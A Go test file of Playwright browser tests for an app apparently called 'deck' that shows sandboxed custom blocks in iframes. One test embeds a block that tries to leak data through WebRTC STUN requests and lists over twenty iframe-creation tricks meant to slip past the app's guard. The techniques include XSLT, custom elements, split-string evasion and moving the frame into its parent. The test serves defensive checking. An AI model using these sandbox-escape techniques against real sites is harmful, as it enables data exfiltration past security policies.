	b := newPlaywright(t)
	b.call("browser_resize", map[string]any{"width": 1200, "height": 800})
	b.open(e.URL + "/?token=" + token + "#/p/web/main")
	b.until("the window of deck the block opened", `location.hash.includes('dialog=note-help') && document.querySelector('[data-dialog="note-help"]')`)
	b.until("the frame over the whole screen", `(() => { const r = document.querySelector('iframe[data-custom]').getBoundingClientRect(); return r.width >= innerWidth - 1 && r.height >= innerHeight - 1 })()`)
	e.waitFor("the report of the block", func() bool {
		for _, c := range e.Fake.Calls() {
			if strings.Contains(c.Prompt, `\"outside\":true`) && strings.Contains(c.Prompt, `\"mode\":\"fullscreen\"`) {
				return true
			}
		}
		return false
	})
}

// customParams is a custom block that reports the params deck gave it beside its items.
const customParams = `<!doctype html><html><body><script type="module">
import { App } from "/ext-apps.js";
const app = new App({ name: "params", version: "1" });
app.ontoolresult = (r) => app.callServerTool({ name: "web.mark", arguments: { text: JSON.stringify(r.structuredContent.params) } });
await app.connect();
</script></body></html>`

// TestRealBrowserCustomBlockGetsItsParams: the params of a custom block, fixed and from the address of its screen,
// reach its frame in the tool result beside its items.
func TestRealBrowserCustomBlockGetsItsParams(t *testing.T) {
	if os.Getenv("DECK_REAL_BROWSER") == "" {
		t.Skip("set DECK_REAL_BROWSER=1 to run against Playwright MCP")
	}
	checkBuiltClient(t)
	e := newEnv(t, webNotesAgent())
	chart := `"document": "custom/chart.html", "source": {"collection": "notes", "sort": "title"},`
	e.createProject("web", strings.NewReplacer(`{"name": "main", "title": "Web", "blocks": [`, `{"name": "main", "title": "Web", "params": {"kind": "string"}, "blocks": [`,
		chart, chart+` "params": {"mode": "voice", "kind": "=param.kind"},`).Replace(webNotesMark))
	e.must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": customParams}, nil)
	b := newPlaywright(t)
	b.open(e.URL + "/?token=" + token + "#/p/web/main?kind=video")
	e.waitFor("the params the block got", func() bool {
		for _, c := range e.Fake.Calls() {
			if strings.Contains(c.Prompt, `\"mode\":\"voice\"`) && strings.Contains(c.Prompt, `\"kind\":\"video\"`) {
				return true
			}
		}
		return false
	})
}

// customPicture is a custom block that shows a picture of the data folder of its module by MCP Apps resources/read
// and tries a stored file of another module, then reports both.
const customPicture = `<!doctype html><html><body><img id="pic"><script type="module">
import { App } from "/ext-apps.js";
const app = new App({ name: "picture", version: "1" });
await app.connect();
const url = async (uri) => { const c = (await app.readServerResource({ uri })).contents[0];
  return URL.createObjectURL(new Blob([Uint8Array.from(atob(c.blob), (x) => x.charCodeAt(0))], { type: c.mimeType })); };
const pic = document.getElementById("pic");
pic.src = await url("deck://data/pics/dot.png");
await pic.decode();
const other = await url("deck://file/%d").then(() => "read", (e) => "refused: " + e.message);
await app.callServerTool({ name: "web.mark", arguments: { text: JSON.stringify({ width: pic.naturalWidth, other }) } });
</script></body></html>`

// TestRealBrowserCustomBlockShowsAPictureOfItsModule: a custom block shows a picture from the data folder of its
// module, and cannot open a file of another module.
func TestRealBrowserCustomBlockShowsAPictureOfItsModule(t *testing.T) {
	if os.Getenv("DECK_REAL_BROWSER") == "" {
		t.Skip("set DECK_REAL_BROWSER=1 to run against Playwright MCP")
	}
	checkBuiltClient(t)
	for _, browser := range [][]string{nil, {"webkit"}} {
		t.Run(fmt.Sprint(browser), func(t *testing.T) { customPictureIn(t, browser...) })
	}
}

// customPictureIn shows the picture block in a browser and checks that it reads its file without a refusal shown.
func customPictureIn(t *testing.T, browser ...string) {
	e := newEnv(t, webNotesAgent())
	p := e.createProject("web", webNotesMark)
	e.createProject("other", plainManifest)
	theirs := e.upload("other", "theirs.png", "image/png", "theirs")
	var pic bytes.Buffer
	_ = png.Encode(&pic, image.NewRGBA(image.Rect(0, 0, 3, 2)))
	data := deckhome.Layout(e.App.Cfg.Home).Data(p)
	_ = os.MkdirAll(filepath.Join(data, "pics"), 0o700)
	_ = os.WriteFile(filepath.Join(data, "pics", "dot.png"), pic.Bytes(), 0o600)
	e.must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": fmt.Sprintf(customPicture, theirs)}, nil)
	b := newPlaywright(t, browser...)
	b.open(e.URL + "/?token=" + token + "#/p/web/main")
	b.until("the custom block", `document.querySelector('iframe[data-custom]')`)
	e.waitFor("the report of the block", func() bool {
		for _, c := range e.Fake.Calls() {
			if strings.Contains(c.Prompt, `\"width\":3`) && strings.Contains(c.Prompt, `\"other\":\"refused: `) {
				return true
			}
		}
		return false
	})
	if got := b.eval(`document.querySelector('[data-custom-error]')?.innerText ?? ''`); strings.Trim(got, `"`) != "" {
		t.Fatalf("a block that works shows no refusal: %s", got)
	}
}

// TestRealBrowserAButtonOpensTheChatInANewTopic: a chat button, or the address with chat=new, opens the chat of the
// master beside the screen in a new topic with the microphone at hand.
func TestRealBrowserAButtonOpensTheChatInANewTopic(t *testing.T) {
	if os.Getenv("DECK_REAL_BROWSER") == "" {
		t.Skip("set DECK_REAL_BROWSER=1 to run against Playwright MCP")
	}
	checkBuiltClient(t)
	e := newEnv(t, ok)
	e.createProject("work", strings.Replace(boardManifest, `"actions": [{"label": "Move"`, `"actions": [{"label": "New task", "chat": true}, {"label": "Move"`, 1))
	e.must("deck.records_upsert", map[string]any{"project": "work", "collection": "tasks", "records": `{"title": "a", "status": "doing"}`}, nil)
	b := newPlaywright(t)
	b.call("browser_resize", map[string]any{"width": 1400, "height": 900})
	b.open(e.URL + "/?token=" + token + "#/p/work/board")
	b.until("the board", `document.querySelector('[data-board] [data-card]')`)
	b.eval(`([...document.querySelectorAll('[data-card] button')].find((x) => x.innerText.includes('New task')).click(), '')`)
	b.until("the chat beside the board in a new topic, the microphone at hand", `document.querySelector('[data-chat-panel] [data-chat-input]') && document.querySelector('[data-board]') && !document.querySelector('[data-chat-panel] [data-message]') && document.activeElement?.matches('[data-mic]')`)
	b.eval(`(document.querySelector('[data-chat-close]').click(), '')`)
	b.until("the chat closed", `!document.querySelector('[data-chat-panel]')`)
	b.open(e.URL + "/#/p/work/board?chat=new")
	b.until("the chat from the address", `document.querySelector('[data-chat-panel] [data-chat-input]') && !location.hash.includes('chat=')`)
}

// TestRealBrowserCustomBlockSendsNothingByWebRTC: a custom block sends nothing by WebRTC past its CSP, from its window
// or a frame of its own; it makes no frame by any way the guard names, each of which calls a STUN server of its own.
func TestRealBrowserCustomBlockSendsNothingByWebRTC(t *testing.T) {
	if os.Getenv("DECK_REAL_BROWSER") == "" {
		t.Skip("set DECK_REAL_BROWSER=1 to run against Playwright MCP")
	}
	checkBuiltClient(t)
	ways := []string{"createElement", "createElementObject", "createElementNS", "createDocument", "innerHTML", "innerHTMLObject",
		"outerHTML", "shadowInnerHTML", "insertAdjacentHTML", "setHTMLUnsafe", "shadowSetHTMLUnsafe", "write", "writeln",
		"execCommand", "parseFromString", "createContextualFragment", "parseHTMLUnsafe", "xslt", "customElement",
		"cloneFrameOfBlock", "importFrameOfBlock", "moveFrameOfBlock"}
	got := make(chan string, len(ways)+3)
	ports := map[string]string{}
	for _, w := range append([]string{"window", "html", "root"}, ways...) {
		stun, err := net.ListenPacket("udp4", "127.0.0.1:0")
		if err != nil {
			t.Fatal(err)
		}
		defer stun.Close()
		ports[w] = stun.LocalAddr().String()
		go func(w string) {
			if _, _, err := stun.ReadFrom(make([]byte, 2048)); err == nil {
				got <- w
			}
		}(w)
	}
	at, _ := json.Marshal(ports)
	// A frame of the block leaks by a script of its own: the block cannot reach a frame of an origin of its own.
	lib := `const at = ` + string(at) + `;
const leaks = (way) => '<script>try { const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:' + at[way] + '" }] }); pc.createDataChannel("l"); pc.createOffer().then((o) => pc.setLocalDescription(o)); } catch (e) {}</' + 'script>';
const F = "ifr" + "ame";
const T = (way) => "<" + F + " srcdoc='" + leaks(way).replace(/&/g, "&amp;").replace(/'/g, "&#39;") + "'></" + F + ">";
const frame = (way, f) => { f.srcdoc = leaks(way); return f; };
`
	e := newEnv(t, webNotesAgent())
	e.createProject("web", webNotesMark)
	e.must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": `<!doctype html><html><body><script>
` + lib + `
try { const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:" + at.window }] }); pc.createDataChannel("l"); pc.createOffer().then((o) => pc.setLocalDescription(o)); } catch (e) {}
const twice = (v) => { let n = 0; return { toString() { return n++ ? v : "div"; } }; };
const box = () => { const d = document.createElement("div"); document.body.appendChild(d); return d; };
const ways = {
  createElement: (d, w) => d.appendChild(frame(w, document.createElement(F))),
  createElementObject: (d, w) => d.appendChild(frame(w, document.createElement(twice(F)))),
  createElementNS: (d, w) => d.appendChild(frame(w, document.createElementNS("http://www.w3.org/1999/xhtml", F))),
  createDocument: (d, w) => d.appendChild(frame(w, document.adoptNode(document.implementation.createDocument("http://www.w3.org/1999/xhtml", F).documentElement))),
  innerHTML: (d, w) => { d.innerHTML = T(w); },
  innerHTMLObject: (d, w) => { d.innerHTML = twice(T(w)); },
  outerHTML: (d, w) => { d.appendChild(document.createElement("p")).outerHTML = T(w); },
  shadowInnerHTML: (d, w) => { d.attachShadow({ mode: "open" }).innerHTML = T(w); },
  insertAdjacentHTML: (d, w) => d.insertAdjacentHTML("beforeend", T(w)),
  setHTMLUnsafe: (d, w) => d.setHTMLUnsafe(T(w)),
  shadowSetHTMLUnsafe: (d, w) => d.attachShadow({ mode: "open" }).setHTMLUnsafe(T(w)),
  write: (d, w) => document.write(T(w)),
  writeln: (d, w) => document.writeln(T(w)),
  execCommand: (d, w) => { d.contentEditable = "true"; d.focus(); if (!document.execCommand("insertHTML", false, T(w))) throw new Error("not run"); },
  parseFromString: (d, w) => d.appendChild(document.adoptNode(new DOMParser().parseFromString(T(w), "text/html").body.firstChild)),
  createContextualFragment: (d, w) => { const r = document.createRange(); r.selectNodeContents(d); d.appendChild(r.createContextualFragment(T(w))); },
  parseHTMLUnsafe: (d, w) => d.appendChild(document.adoptNode(Document.parseHTMLUnsafe(T(w)).body.firstChild)),
  xslt: (d, w) => {
    const xsl = new DOMParser().parseFromString('<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:element name="{concat(&quot;ifr&quot;, &quot;ame&quot;)}" namespace="http://www.w3.org/1999/xhtml"/></xsl:template></xsl:stylesheet>', "application/xml");
    const x = new XSLTProcessor();
    x.importStylesheet(xsl);
    const f = x.transformToFragment(new DOMParser().parseFromString("<a/>", "application/xml"), document);
    frame(w, f.firstChild);
    d.appendChild(f);
  },
  customElement: (d, w) => {
    customElements.define("x-frame", class extends HTMLIFrameElement {}, { extends: F });
    d.appendChild(frame(w, new (customElements.get("x-frame"))()));
  },
  cloneFrameOfBlock: (d, w) => d.appendChild(frame(w, frameElement.cloneNode())),
  importFrameOfBlock: (d, w) => d.appendChild(frame(w, document.importNode(frameElement))),
  moveFrameOfBlock: (d, w) => parent.document.body.appendChild(frameElement),
};
window.made = [];
for (const [way, make] of Object.entries(ways)) {
  const d = box(), count = () => document.querySelectorAll(F).length + (d.shadowRoot ? d.shadowRoot.querySelectorAll(F).length : 0);
  const before = count();
  try { make(d, way); } catch (e) {}
  if (count() > before) made.push(way);
}
</script><script type="module">
import { App } from "/ext-apps.js";
const app = new App({ name: "rtc", version: "1" });
await app.connect();
await app.callServerTool({ name: "web.mark", arguments: { text: "made [" + window.made.join(",") + "]" } });
</script></body></html>`}, nil)
	b := newPlaywright(t)
	b.open(e.URL + "/?token=" + token + "#/p/web/main")
	b.until("the custom block", `document.querySelector('iframe[data-custom]')`)
	e.waitFor("the block to tell the frames it made", func() bool {
		for _, c := range e.Fake.Calls() {
			if m := regexp.MustCompile(`made \[([\w,]*)\]`).FindStringSubmatch(c.Prompt); m != nil {
				if m[1] != "" {
					t.Errorf("a custom block makes a frame by %s", m[1])
				}
				return true
			}
		}
		return false
	})
	wait := func(what string) {
		select {
		case w := <-got:
			t.Fatalf("%s reached a STUN server through %s", what, w)
		case <-time.After(8 * time.Second):
		}
	}
	wait("a custom block")
	for i, c := range []struct{ name, html string }{
		{"a frame in the HTML of the block", `<!doctype html><html><body><iframe srcdoc="x"></iframe><script>` + lib + `document.querySelector(F).srcdoc = leaks("html");</script></body></html>`},
		{"a frame as the root of the document", `<!doctype html><html><body><script>` + lib + `
try { const f = frame("root", document.createElement(F)); document.removeChild(document.documentElement); document.append(f); } catch (e) {}
</script></body></html>`},
	} {
		e.must("deck.document_save", map[string]any{"project": "web", "name": "custom/chart.html", "kind": "custom", "text": c.html}, nil)
		b.open(fmt.Sprintf("%s/?token=%s&case=%d#/p/web/main", e.URL, token, i))
		b.until("the custom block again", `document.querySelector('iframe[data-custom]')`)
		wait(c.name)
	}
}

const readableManifest = `{
  "version": 13,
  "collections": [{"name": "jobs", "description": "Jobs", "key": "name", "display": "name", "schema": {"type": "object", "required": ["name"],
    "properties": {"name": {"type": "string"}, "status": {"type": "string"}, "why": {"type": "string"}, "note": {"type": "string"},
      "owner": {"type": "string"}, "host": {"type": "string"}, "region": {"type": "string"}, "started": {"type": "string"}}}}],
  "screens": [{"name": "jobs", "title": "Jobs", "blocks": [
    {"type": "table", "title": "Jobs", "source": {"collection": "jobs", "sort": "name"}, "columns": [
      {"label": "Name", "bind": "name"},
      {"label": "Status", "bind": "status", "format": "tag", "tone": "status == 'error' ? 'error' : 'ok'", "details": "why ?? ''"},
      {"label": "Note", "bind": "note ?? ''"},
      {"label": "Owner", "bind": "owner ?? ''"},
      {"label": "Host", "bind": "host"},
      {"label": "Region", "bind": "region ?? ''"},
      {"label": "Started", "bind": "started", "format": "relative"}
    ]}
  ]}],
  "menu": ["jobs"]
}`

// TestRealBrowserReadableTable: a line shows four columns (two on a phone) but an empty one, a long text in two lines,
// a status as a badge with why as its hint; the rest opens under it without empty values.
func TestRealBrowserReadableTable(t *testing.T) {
	if os.Getenv("DECK_REAL_BROWSER") == "" {
		t.Skip("set DECK_REAL_BROWSER=1 to run against Playwright MCP")
	}
	checkBuiltClient(t)
	e := newEnv(t, nil)
	e.createProject("ops", readableManifest)
	now := time.Now().UTC().Format(time.RFC3339)
	e.must("deck.records_upsert", map[string]any{"project": "ops", "collection": "jobs", "records": jsonl(
		map[string]any{"name": "backup", "status": "error", "why": "the disk is full: 0 bytes left on /backup", "note": strings.Repeat("a long note that goes on and on ", 20),
			"host": "nas", "region": "home", "started": now},
		map[string]any{"name": "mail", "status": "ok", "host": "vps", "started": now})}, nil)

	b := newPlaywright(t)
	b.call("browser_resize", map[string]any{"width": 1440, "height": 900})
	b.open(e.URL + "/?token=" + token + "#/p/ops/jobs")
	b.until("the table", `document.querySelectorAll('[data-table] tbody tr').length === 2`)
	heads := `[...document.querySelectorAll('[data-table] th')].map((x) => x.innerText.trim()).filter(Boolean).join('|')`
	if got := b.eval(heads); got != "Name|Status|Note|Host" {
		t.Fatalf("a line shows the first four columns with a value, never the empty one: %s", got)
	}
	if got := b.eval(`(() => { const c = [...document.querySelectorAll('[data-table] tbody tr')][0].querySelectorAll('td')[3].firstElementChild;
		return String(c.scrollHeight > c.clientHeight && c.clientHeight < 60) })()`); got != "true" {
		t.Fatalf("a long text is cut to two lines: %s", got)
	}
	if got := b.eval(`String(!!document.querySelector('[data-table] tbody tr [data-format="tag"][data-hint]') && !document.querySelector('[data-table] tbody tr').innerText.includes('disk is full'))`); got != "true" {
		t.Fatalf("a status is a badge with why as its hint, not a text of the line: %s", got)
	}
	b.shot("readable-table")
	b.eval(`(document.querySelector('[data-table] tbody tr [data-row-toggle]').click(), '')`)
	b.until("the rest of the row under it", `document.querySelector('[data-row-more]')`)
	if got := b.eval(`[...document.querySelectorAll('[data-row-more] dt')].map((x) => x.innerText.trim()).join('|')`); got != "Region|Started|Status" {
		t.Fatalf("the row opened under a line has the rest of its columns and its details, without the empty ones: %s", got)
	}
	if got := b.eval(`String(document.querySelector('[data-row-more]').innerText.includes('disk is full'))`); got != "true" {
		t.Fatal("the opened row shows why in full")
	}
	b.shot("readable-table-open")

	b.call("browser_resize", map[string]any{"width": 390, "height": 844})
	b.until("two columns on a phone", heads+` === 'Name|Status'`)
	if got := b.eval(`String(document.documentElement.scrollWidth <= innerWidth + 1)`); got != "true" {
		t.Fatalf("the table fits the width of a phone: %s", got)
	}
	b.shot("readable-table-phone")
}
